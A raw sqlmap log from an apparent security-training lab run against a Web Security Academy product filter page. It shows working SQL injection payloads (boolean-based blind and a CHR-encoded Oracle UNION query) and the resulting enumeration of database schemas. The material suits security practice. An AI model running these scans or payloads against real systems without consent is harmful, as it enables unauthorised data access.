        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:17:52 /2024-09-22/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[1/1] URL:
GET https://0a55008a04dc74318083266100950044.web-security-academy.net/filter?category=Gifts
do you want to test this URL? [Y/n/q]
> Y
[17:17:52] [INFO] testing URL 'https://0a55008a04dc74318083266100950044.web-security-academy.net/filter?category=Gifts'
[17:17:52] [INFO] using '/home/a7med/.local/share/sqlmap/output/results-09222024_0517pm.csv' as the CSV results file in multiple targets mode
[17:17:52] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('session=TLsCdBWDbw9...MWEli4hfE7'). Do you want to use those [Y/n] Y
[17:17:53] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:17:54] [INFO] testing if the target URL content is stable
[17:17:54] [INFO] target URL content is stable
[17:17:54] [INFO] testing if GET parameter 'category' is dynamic
[17:17:55] [INFO] GET parameter 'category' appears to be dynamic
[17:18:00] [WARNING] heuristic (basic) test shows that GET parameter 'category' might not be injectable
[17:18:01] [INFO] testing for SQL injection on GET parameter 'category'
[17:18:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:18:02] [WARNING] reflective value(s) found and filtering out
[17:18:03] [INFO] GET parameter 'category' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="If")
[17:18:37] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Oracle' 
it looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Oracle' extending provided level (1) and risk (1) values? [Y/n] Y
[17:18:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:18:39] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[17:18:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[17:18:52] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[17:18:53] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:18:54] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:18:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[17:18:55] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[17:18:55] [INFO] testing 'Oracle error-based - Parameter replace'
[17:18:55] [INFO] testing 'Generic inline queries'
[17:18:56] [INFO] testing 'Oracle inline queries'
[17:18:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:18:57] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[17:18:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[17:19:05] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[17:19:05] [INFO] testing 'Oracle stacked queries (heavy query)'
[17:19:06] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[17:19:06] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[17:19:13] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[17:19:13] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[17:19:13] [INFO] testing 'Oracle AND time-based blind'
[17:19:14] [INFO] testing 'Oracle OR time-based blind'
[17:19:14] [INFO] testing 'Oracle AND time-based blind (comment)'
[17:19:22] [INFO] testing 'Oracle OR time-based blind (comment)'
[17:19:22] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[17:19:26] [INFO] testing 'Oracle OR time-based blind (heavy query)'
[17:19:27] [INFO] testing 'Oracle AND time-based blind (heavy query - comment)'
[17:19:28] [INFO] testing 'Oracle OR time-based blind (heavy query - comment)'
[17:19:30] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
[17:19:30] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
[17:19:30] [INFO] testing 'Oracle time-based blind - Parameter replace (heavy queries)'
[17:19:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:19:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:19:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:19:42] [INFO] target URL appears to have 2 columns in query
[17:19:46] [INFO] GET parameter 'category' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[17:19:46] [WARNING] applying generic concatenation (CONCAT)
[17:19:47] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'category' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=Gifts' AND 3454=3454 AND 'ShgE'='ShgE

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: category=Gifts' UNION ALL SELECT CHR(113)||CHR(122)||CHR(98)||CHR(113)||CHR(113)||CHR(107)||CHR(84)||CHR(72)||CHR(74)||CHR(90)||CHR(114)||CHR(111)||CHR(73)||CHR(77)||CHR(75)||CHR(77)||CHR(85)||CHR(73)||CHR(74)||CHR(71)||CHR(68)||CHR(74)||CHR(118)||CHR(90)||CHR(97)||CHR(82)||CHR(101)||CHR(90)||CHR(75)||CHR(102)||CHR(65)||CHR(90)||CHR(89)||CHR(119)||CHR(119)||CHR(99)||CHR(90)||CHR(75)||CHR(98)||CHR(77)||CHR(70)||CHR(87)||CHR(99)||CHR(74)||CHR(74)||CHR(113)||CHR(113)||CHR(118)||CHR(118)||CHR(113),NULL FROM DUAL-- OBRi
---
do you want to exploit this SQL injection? [Y/n] Y
[17:19:47] [INFO] testing Oracle
[17:19:50] [INFO] confirming Oracle
[17:19:50] [INFO] the back-end DBMS is Oracle
back-end DBMS: Oracle
[17:19:50] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes
[17:19:50] [INFO] fetching database (schema) names
available databases [7]:
[*] APEX_040000
[*] CTXSYS
[*] MDSYS
[*] PETER
[*] SYS
[*] SYSTEM
[*] XDB

[17:20:02] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 51 times
[17:20:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/a7med/.local/share/sqlmap/output/results-09222024_0517pm.csv'
[17:20:02] [WARNING] your sqlmap version is outdated

[*] ending @ 17:20:02 /2024-09-22/

